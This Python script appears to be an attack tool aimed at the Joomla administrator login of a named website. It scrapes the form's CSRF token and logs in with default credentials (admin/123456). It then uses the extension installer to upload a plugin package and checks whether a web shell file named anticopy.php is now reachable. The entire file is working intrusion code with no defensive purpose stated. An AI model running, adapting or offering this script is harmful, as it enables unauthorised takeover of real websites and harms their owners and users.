#!/usr/bin/python
# -*- coding: utf-8 -*-
import sys
import requests
import lxml.html
import os

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.0; rv:14.0) Gecko/20100101 Firefox/14.0.1',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'ru-ru,ru;q=0.8,en-us;q=0.5,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'keep-alive',
    'DNT': '1'
}

'''for i in range(100):
    time.sleep(1)
    sys.stdout.write("\r%d%%" % i)
    sys.stdout.flush()'''
url = 'http://SMART-EGYPT.NET/administrator/index.php'
def upload(url):
    s = requests.Session()
    try:    
        response = s.get(url, headers=headers, timeout = 10)
    except Exception:
        print('ERROR while GET')
    try:
        parsed = lxml.html.fromstring(response.text)
        links = parsed.xpath("//input[@value]")
        #print(links)
        list = []
        for i in links:
            #print(i.attrib['value'])
            list.append(i.attrib['value'])
            #print(list)
        for i in links:
            #print(i.attrib['name'])
            cod = (i.attrib['name'])
            retur = list[2]
        print('######Version 3.x.x######')
        print(cod)
        print(retur)
        print('#########################')
    except:
        try:
            parsed = lxml.html.fromstring(response.text)
            links = parsed.xpath("//input[@value]")
            #print(links)
            r = []
            c = []
            for i in links:
                #print(i.attrib['value'])
                r.append(i.attrib['value'])
                i=response.text.index('hidebtn')
                s1=response.text[i+1:]
                parsed = lxml.html.fromstring(s1)
                links = parsed.xpath("//input[@value]")
                #print(s1)
            for i in links:
                #print(i.attrib['name'])
                cod = (i.attrib['name'])
                retur = r[3]
            print('######Version 2.x.x######')
            print(cod)
            print(retur)
            print('#########################')
        except:
            print('Error parsing url')
    payload = {
        'username':'admin',
        'passwd':'123456',
        'option': 'com_login',
        'task': 'login',
        'return':retur, 
        cod: '1'
    }
    try:    
        s.post(url, data=payload, headers=headers, timeout = 10)
    except Exception:
        print('ERROR while POST')
    response = s.get(url, headers=headers, timeout = 10)
    #if response.status_code == 200:
    if response.text.find('task=logout')>0:
        print('GOOD')
    else:
        print('FALSE')
    #=======================================================================
    #+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
    try:    
        response = s.get(url+'?option=com_installer', headers=headers, timeout = 10)
    except Exception:
        print('ERROR while GET')
    try:
        parsed = lxml.html.fromstring(response.text)
        links = parsed.xpath("//input[@value]")
        print(links)
        list = []
        for i in links:
            #print(i.attrib['value'])
            list.append(i.attrib['value'])
            print(list[0])
        for i in links:
            #print(i.attrib['name'])
            cod = (i.attrib['name'])
            #retur = list[2]
        print('cod: '+cod+' install_dir: '+list[0])
    except:
        print('Error while parsing...')
    files = {'install_package': open('plg_system_anticopy_v1.8.2_J2.5-3.x.zip','rb')}                                                
    payload = {
        'install_directory':list[0],
        'install_url': 'http://',
        'type': '',
        'installtype':'upload',
        'task':'install.install',  
        cod: '1'
    }
    #print(payload)
    #print(files)
    try:
        response = s.post(url+'?option=com_installer', files=files, data=payload, headers=headers, timeout = 10)
        #print(url)
        print('----------------------------------------------------------------------------')
        #print(response.text)
    except:
        print('Error while upload plugin...')
    try:
        s = url.split('/')
        response = requests.get(s[0]+'/'+s[1]+'/'+s[2]+'/'+s[3]+'/'+'plugins/system/anticopy/anticopy.php', headers=headers, timeout = 10)
        if response.status_code == 200:
            print('Shell uploaded...')
        else:
            print('Shell not uploaded...')
    except:
        print('Erroe while get shell...')
        
upload(url)
